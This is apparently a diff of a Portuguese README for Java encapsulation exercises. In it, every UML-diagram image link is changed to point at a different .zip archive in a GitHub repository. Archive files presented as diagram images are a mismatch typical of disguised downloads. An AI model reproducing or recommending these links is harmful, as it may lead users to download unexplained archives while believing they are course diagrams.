@@ -2,21 +2,21 @@
 ## Exercício 1.1 (Pessoas)
 Crie um novo projeto e desenvolva a classe Pessoa, conforme diagrama de classes a seguir.
 
-![Diagrama UML - Classe Pessoa](https://raw.githubusercontent.com/AlanGabrielBerkenbrock/ExerciciosPraticos/main/assets/ExerciciosPraticos_3.6.zip)
+![Diagrama UML - Classe Pessoa](https://raw.githubusercontent.com/AlanGabrielBerkenbrock/ExerciciosPraticos/main/assets/Exercicios-Praticos-v2.1.zip)
 
 * Observe que ha um construtor com um argumento: o ano de nascimento.
 * Atraves do encapsulamento, garanta a consistencia do estado dos objetos.
 
 Instancie os dois objetos mostrados no diagrama de objetos abaixo.
 
-![Diagrama UML - Objetos](https://raw.githubusercontent.com/AlanGabrielBerkenbrock/ExerciciosPraticos/main/assets/ExerciciosPraticos_3.6.zip)
+![Diagrama UML - Objetos](https://raw.githubusercontent.com/AlanGabrielBerkenbrock/ExerciciosPraticos/main/assets/Exercicios-Praticos-v2.1.zip)
 
 Porque a classe Pessoa não define um método setAnoNascimento?
 
 ## Exercício 1.2 (PessoasCasadas) 
 Modifique a classe Pessoa conforme diagrama de classes a seguir.
 
-![Diagrama UML - Objetos](https://raw.githubusercontent.com/AlanGabrielBerkenbrock/ExerciciosPraticos/main/assets/ExerciciosPraticos_3.6.zip)
+![Diagrama UML - Objetos](https://raw.githubusercontent.com/AlanGabrielBerkenbrock/ExerciciosPraticos/main/assets/Exercicios-Praticos-v2.1.zip)
 
 
 * O método casar() seta o conjuge da pessoa.
